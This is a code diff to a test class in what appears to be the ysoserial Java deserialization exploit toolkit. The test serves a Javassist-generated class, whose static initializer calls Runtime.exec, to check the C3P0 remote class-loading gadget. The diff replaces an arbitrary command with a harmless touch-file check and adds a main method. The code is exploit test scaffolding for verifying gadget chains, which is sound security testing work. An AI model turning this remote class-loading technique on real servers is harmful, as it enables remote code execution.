@@ -12,6 +12,8 @@ import fi.iki.elonen.NanoHTTPD.Response.Status;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import ysoserial.payloads.C3P0;
+import ysoserial.test.CustomTest;
 import ysoserial.test.WrappedTest;
 
 
@@ -19,17 +21,10 @@ import ysoserial.test.WrappedTest;
  * @author mbechler
  *
  */
-public class RemoteClassLoadingTest implements WrappedTest {
+public class RemoteClassLoadingTest extends CommandExecTest implements WrappedTest, CustomTest {
 
-    int port;
-    private String command;
-    private String className;
-
-    public RemoteClassLoadingTest ( String command ) {
-        this.command = command;
-        this.port = new Random().nextInt(65535-1024)+1024;
-        this.className = "Exploit-" + System.currentTimeMillis();
-    }
+    private int port = new Random().nextInt(65535-1024)+1024;
+    private String className = "Exploit-" + System.currentTimeMillis();
 
 
     public String getPayloadArgs () {
@@ -54,7 +49,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
             pool.insertClassPath(new ClassClassPath(Exploit.class));
             final CtClass clazz = pool.get(Exploit.class.getName());
             clazz.setName(this.className);
-            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + getTouchCmd(testFile.toString()).replace("\\", "\\\\").replace("\"", "\\\"") + "\");");
             return clazz.toBytecode();
         }
         catch ( Exception e ) {
@@ -121,6 +116,10 @@ public class RemoteClassLoadingTest implements WrappedTest {
 
     }
 
+
+    public static void main(String[] args) throws Exception {
+        PayloadsTest.testPayload(C3P0.class);
+    }
 
 
     public static class Exploit implements Serializable {
